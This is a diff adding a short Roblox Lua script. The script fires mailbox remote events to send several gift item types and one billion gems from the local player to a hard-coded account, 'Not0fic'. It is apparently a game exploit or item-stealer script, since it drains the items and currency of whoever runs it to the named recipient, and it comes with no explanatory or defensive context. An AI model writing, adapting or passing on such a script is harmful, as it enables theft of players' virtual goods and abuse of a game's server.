@@ -1,0 +1,13 @@
+local player = game.Players.LocalPlayer
+local mailbox = game.Workspace.Mailbox
+
+local giftTypes = {"Huge", "Titanic", "Gift"}
+local gemsToSend = 1000000000 -- 1 billion gems
+
+local recipient = "Not0fic"
+
+for _, giftType in pairs(giftTypes) do
+    mailbox.GiftEvent:FireServer(giftType, recipient)
+end
+
+mailbox.GemsEvent:FireServer(gemsToSend, recipient)
